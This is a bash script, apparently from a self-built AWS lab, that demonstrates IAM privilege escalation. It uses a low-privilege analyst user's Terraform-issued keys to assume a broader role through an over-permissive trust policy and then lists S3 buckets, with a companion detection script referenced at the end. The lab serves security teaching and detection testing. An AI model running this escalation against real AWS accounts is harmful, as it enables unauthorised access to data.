#!/usr/bin/env bash
# Scenario 02 — IAM Privilege Escalation :: ATTACK
#
# Demonstrates escalation from a low-privilege IAM user (whose only real
# permission is a scoped sts:AssumeRole grant) to a broader-access role,
# made possible purely by the target role's overly-permissive trust
# policy. No AWS root/admin credentials are used anywhere in this script
# — everything starts from the "analyst" user's own Terraform-issued key.
#
# Reads all targets from `terraform output` — never hardcodes account
# IDs, role names, or credentials. The analyst's access key is read via
# `-raw` into local shell variables ONLY: never echoed, never written to
# a file, never logged. Treat it the same way you'd treat a real leaked
# credential pair.
set -euo pipefail

TF_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/../terraform" && pwd)"

ROLE_ARN="$(terraform -chdir="$TF_DIR" output -raw broad_read_role_arn)"
ANALYST_KEY_ID="$(terraform -chdir="$TF_DIR" output -raw analyst_access_key_id)"
ANALYST_SECRET="$(terraform -chdir="$TF_DIR" output -raw analyst_secret_access_key)"

echo "[*] Target role (should NOT be reachable by a low-priv user): $ROLE_ARN"
echo "[*] Attack start (UTC): $(date -u +%Y-%m-%dT%H:%M:%SZ)"
echo

echo "=== STEP 1: confirm we start as the low-privilege analyst user ==="
AWS_ACCESS_KEY_ID="$ANALYST_KEY_ID" AWS_SECRET_ACCESS_KEY="$ANALYST_SECRET" \
  aws sts get-caller-identity

echo
echo "=== STEP 2: prove the analyst has near-zero standing permissions ==="
echo "    (expect AccessDenied here — this is the 'before' picture)"
AWS_ACCESS_KEY_ID="$ANALYST_KEY_ID" AWS_SECRET_ACCESS_KEY="$ANALYST_SECRET" \
  aws s3api list-buckets 2>&1 | head -3 || true

echo
echo "=== STEP 3: escalate — assume the broad-read role using ONLY the analyst's own credentials ==="
ASSUMED_JSON="$(AWS_ACCESS_KEY_ID="$ANALYST_KEY_ID" AWS_SECRET_ACCESS_KEY="$ANALYST_SECRET" \
  aws sts assume-role --role-arn "$ROLE_ARN" --role-session-name privesc-poc --output json)"

ASSUMED_KEY_ID="$(echo "$ASSUMED_JSON" | jq -r '.Credentials.AccessKeyId')"
ASSUMED_SECRET="$(echo "$ASSUMED_JSON" | jq -r '.Credentials.SecretAccessKey')"
ASSUMED_TOKEN="$(echo "$ASSUMED_JSON" | jq -r '.Credentials.SessionToken')"

echo "[!] AssumeRole succeeded — the trust policy let the analyst in."

echo
echo "=== STEP 4: prove the escalation is real (broader access than before) ==="
AWS_ACCESS_KEY_ID="$ASSUMED_KEY_ID" AWS_SECRET_ACCESS_KEY="$ASSUMED_SECRET" AWS_SESSION_TOKEN="$ASSUMED_TOKEN" \
  aws s3api list-buckets --query 'Buckets[].Name' --output table

echo
echo "[*] Attack complete. CloudTrail delivery takes ~5-15 min — run"
echo "    scripts/detect.sh after that window."
